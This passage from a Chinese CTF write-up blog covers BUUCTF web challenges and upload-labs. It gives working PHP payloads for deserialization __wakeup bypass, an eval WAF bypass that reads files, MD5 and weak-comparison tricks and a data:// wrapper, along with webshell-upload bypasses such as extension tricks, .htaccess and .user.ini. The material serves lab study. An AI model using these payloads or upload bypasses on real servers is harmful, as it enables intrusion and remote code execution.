class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;100&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164157744.png" alt="image-20230420164157744"></p><p>在反序列化字符串时，属性个数的值大于实际属性个数时，会<strong>跳过 __wakeup()函数</strong>的执行</p><p>在Name和username前面有\0前缀，这与php的序列化方式有关。但在url提交payload的时候使用\0会被当成空白符丢失。因此要讲\0替换成%00。</p><p>原来的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p>更改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164607721.png" alt="image-20230420164607721"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>找一下源文件</p><p>在index.php.bak里面（用dirsearch扫）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP弱类型比较绕过<a href="http://t.csdn.cn/SgTWa">看他</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure><p><strong>flag<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165407197.png" alt="image-20230420165407197"></strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>找到信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165522754.png" alt="image-20230420165522754"></p><p>用了一个WAF确保安全</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了很多字符.正常字符没办法直接使用，只能为数字。但是可以使用 ASCII码</p><p>绕过waf</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165817333.png" alt="image-20230420165817333"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php? num=2;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>其中var_dump()用来打印；<br> scandir（）用来获扫描目录下文件；<br> chr（47）是“&#x2F;”的ASCII编码</p><p>chr()函数可以是ASCLL码变成字符，ord()函数相反</p><p>file_get_contents() 是用于将文件的内容读入到一个字符串</p><p>发现</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170107136.png" alt="image-20230420170107136"></p><p>读取一下看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170248010.png" alt="image-20230420170248010"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>找到信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>is_numeric()函数，检测变量是否为数字或数字字符串</p><p>password不能是数字或数字字符串，并且password等于404即可</p><p>将user的值改为1，成为本校学生</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185127185.png" alt="image-20230420185127185"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money=1e9</span><br></pre></td></tr></table></figure><p>借助<a href="https://so.csdn.net/so/search?q=url%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">url编码</a>中的空字符，例如%00或者%20，比如404%20，404%00。还有在404后面加字符和符号也可以，例如：404a</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185919916.png" alt="image-20230420185919916"></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进去随便输几个数，没啥反应，看看包</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420190207016.png" alt="image-20230420190207016"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>md5($pass,true)的意思是对pass进行16位原始二进制格式的字符串MD5，而mysql又会把这一串16位二进制解析成十六进制从而当做十六进制编码进行解析。所以我们要找到某一个字符串，16位md5之后变成’or‘的十六进制形式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;的十六进制：276f7227</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop的md5：276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure><p>输入后，跳到&#x2F;levels91.php这，查看源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>科学计数法绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=QNKCDZO&amp;b=s878926199a</span><br></pre></td></tr></table></figure><p>跳到&#x2F;levell14.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>MD5强类型绕过，用数组绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420192000070.png" alt="image-20230420192000070"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>useless.php文件，访问一下</p><p>啥也没有</p><p>isset($text)&amp;&amp;(file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf” 我们需要传入一个内容为welcome to the zjctf的文件，</p><p>data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><p><strong>welcome to the zjctf</strong></p><p>filter协议读取useless.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure><p>解码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  提示了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file=&#x27;flag.php&#x27;;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$password=new Flag();</span><br><span class="line">echo serialize($password);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>联合起来payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(2===3)&#123;  </span><br><span class="line">return (&quot;flag&#123;6633ed89-7eda-4de4-92c5-88bd8fdbe0c7&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/post/80f02bc5.html"/>
      <url>/post/80f02bc5.html</url>
      
        <content type="html"><![CDATA[<p>文件上传漏洞被利用需要<strong>两个前提条件</strong>：</p><p>1、文件能上传成功</p><p>2、攻击者能知道文件路径</p><p>凡是上传图片并显示的关卡，都有<strong>三种方式可以知道文件路径</strong></p><p>1、最简单直接的，在没显示出来的图片上右键选择“复制图像链接”，可以得到文件的绝对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/123c53e523fa4a86aa967a84de16ba67.png" alt="123c53e523fa4a86aa967a84de16ba67"></p><p>2、网页上右键选择“查看页面源代码”，源代码中显示文件的相对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407135835211.png" alt="image-20230407135835211"></p><p>3、如果是用burpsuite上传的文件，response报文中也会显示文件的相对路径。</p><h2 id="Pass-01-前端验证"><a href="#Pass-01-前端验证" class="headerlink" title="Pass-01(前端验证)"></a>Pass-01(前端验证)</h2><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p><code>浏览器disable JS</code></p><p>firefox可以安装一个叫Script Switch的插件，安装成功之后，就是下图右上角小红框里那个图标，使其处在JS disabled状态，上传x.php。出现下图这样没加载成功的图片表示webshell已经上传成功。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/92b2e5477ba24b1eabbe94cf11f0b4a0.png" alt="92b2e5477ba24b1eabbe94cf11f0b4a0"></p><p>到服务器上看看，上传成功的webshell在 <strong>upload-labs目录\upload</strong> 文件夹下</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p> bp抓包修改后缀</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b6b05f1cc2d749eea3164807c384fe7f.png" alt="b6b05f1cc2d749eea3164807c384fe7f"></p><p>蚁剑连接即可看到文件已经上传</p><h2 id="Pass-02-ContentType"><a href="#Pass-02-ContentType" class="headerlink" title="Pass-02(ContentType)"></a>Pass-02(ContentType)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br></pre></td></tr></table></figure><p>第二关主要是对MIME进行检查（ContentType），直接修改为上面的三种类型就可以</p><h2 id="Pass-03-修改httpd-ini"><a href="#Pass-03-修改httpd-ini" class="headerlink" title="Pass-03(修改httpd.ini)"></a>Pass-03(修改httpd.ini)</h2><p>姿势一：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure><p>可以进行双写绕过<code>::$DA::$DATATA</code></p><p>首先上传个1.php，发现页面提示是”不允许上传……后缀文件“，并且burpsuite有抓到包，初步判断，这关可能是后端文件后缀黑名单过滤。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407140010914.png" alt="image-20230407140010914"></p><p>payload写一些有可能被解析为php的文件后缀的字符，大小写绕过，双写绕过，一些利用操作系统特性（比如服务器是windows系统的话，结尾加点，加空格，加::$DATA，后缀某几个字母大写）</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141147135.png"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141107881.png" alt="image-20230407141107881"></p><p>上图的文件后缀是正常的，是有用的，用webshell管理工具连接的时候，文件名写202304071406293829.php就行</p><p>姿势二：</p><p>修改httpd.ini配置文件，将<code>.php3,,php5,,phtml</code>作为php文件</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231121222945950.png" alt="image-20231121222945950"></p><h2 id="Pass-04-htaccess"><a href="#Pass-04-htaccess" class="headerlink" title="Pass-04(.htaccess)"></a>Pass-04(.htaccess)</h2><p>姿势一：</p><p>把后缀改成png之后，可以上传成功。可以初步判断，本关不检查文件内容，检查点应该在<strong>Content-Type</strong>或者<strong>文件后缀</strong>，或者两者都有。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145704699.png" alt="image-20230407145704699"></p><p>先看看Content-Type有无影响。把Content-Type从image&#x2F;png改成application&#x2F;octet-stream，发送之后，发现文件依然能上传成功，说明本关Content-Type无影响。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145850092.png" alt="image-20230407145850092"></p><p>接下来判断一下文件后缀是黑名单过滤还是白名单过滤：</p><p>文件后缀改成.xxx，发送后发现文件上传成功，说明本关还是文件后缀黑名单过滤</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145939292.png" alt="image-20230407145939292"></p><p>HTTP EXP：将文件后缀名改为“<strong>点+空格+点</strong>”的格式，这样<strong>file_ext会变为空</strong>，成功绕过黑名单上传。<strong>Windows会自动删除文件名最后的点</strong>，最后变为2.php。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407151322154.png" alt="image-20230407151322154"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php. .&quot;</span><br></pre></td></tr></table></figure><p>姿势二：</p><p>上传<code>.htaccess</code>文件(分布式配置文件)，优先等级高于http.ini，它的作用范围是本目录和其子目录</p><p>修改配置文件http.ini,将none改为All，允许.htaccess文件生效</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231121224302274.png" alt="image-20231121224302274"></p><p>·htaccess文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png //.png文件当作php文件执行</span><br></pre></td></tr></table></figure><p>访问.png文件即可</p><h2 id="Pass-05-user-ini"><a href="#Pass-05-user-ini" class="headerlink" title="Pass-05(.user.ini)"></a>Pass-05(.user.ini)</h2><h3 id="主要源码"><a href="#主要源码" class="headerlink" title="主要源码"></a>主要源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;省略了&quot;</span>); <span class="comment">//后缀数组，如.php,.phtml等</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">//去除文件名首尾空格</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">//返回.在文件名中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];  <span class="comment">//临时目录文件名</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;  <span class="comment">//保存目录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">//移动临时文件到保存目录，移动成功返回True</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>姿势一：</p><p>和Pass-04一样，代码中只过滤了一次点，删除了空格和::$DATA，将文件后缀改为小写，黑名单等，使用Pass-04的方法绕过即可。但黑名单中屏蔽了.htaccess文件。</p><p>HTTP EXP：文件名改为“2.php. . ”。</p><p>姿势二：</p><p>利用<code>.user.ini</code>文件，优先级高于php.ini</p><p>生效条件：上传目录里必须有php文件，serverAPI要是CGI&#x2F;FastCGI （phpinfo可以进行查看）</p><table><thead><tr><th>Server API</th><th>CGI&#x2F;FastCGI</th></tr></thead></table><p>内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=info.png       //php文件包含info.png</span><br></pre></td></tr></table></figure><h2 id="Pass-6-大小写绕过windows下"><a href="#Pass-6-大小写绕过windows下" class="headerlink" title="Pass-6(大小写绕过windows下)"></a>Pass-6(大小写绕过windows下)</h2><p>与上一关比较，少了一个将后缀转小写的操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure><p>因为windows系统对将<code>.Php</code>转变成<code>.php</code>，导致代码执行成功</p><h2 id="Pass-7-空格绕过windows下"><a href="#Pass-7-空格绕过windows下" class="headerlink" title="Pass-7(空格绕过windows下)"></a>Pass-7(空格绕过windows下)</h2><p>少了一个首尾去空的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>直接在后缀后面加一个空格就行，因为windows系统特性会将文件后面空格删掉</p><p>抓包加空格</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231122200101759.png" alt="image-20231122200101759"></p><h2 id="Pass-8-点绕过windows下"><a href="#Pass-8-点绕过windows下" class="headerlink" title="Pass-8(点绕过windows下)"></a>Pass-8(点绕过windows下)</h2><p>少了一个deldot函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure><p>那我们可以在后缀加上点，就能绕过，操作同上</p><h2 id="Pass-9-DATAwindows下"><a href="#Pass-9-DATAwindows下" class="headerlink" title="Pass-9(::$DATAwindows下)"></a>Pass-9(::$DATAwindows下)</h2><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p><p>目录里有一个1.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 456&gt;1.txt:2.txt</span><br><span class="line">notepad 1.txt:2.txt  //查看额外数据流</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231122203818851.png" alt="image-20231122203818851"></p><p>原1.txt的内容是不受影响的</p><p>我们在文件名加上<code>::$DATA</code>，上传就行</p><h2 id="Pass-10-点空格点绕过windows下"><a href="#Pass-10-点空格点绕过windows下" class="headerlink" title="Pass-10(点空格点绕过windows下)"></a>Pass-10(点空格点绕过windows下)</h2><p>看了源码，发现这些函数只验证一次，例如删除文件末尾的点</p><p>点空格点为什么能绕过？</p><p>有一个文件<code>1.php. .</code></p><p>首先deldot函数会去掉末尾的一个点，变成<code>1.php. </code></p><p>strrchr函数取的后缀是<code>. 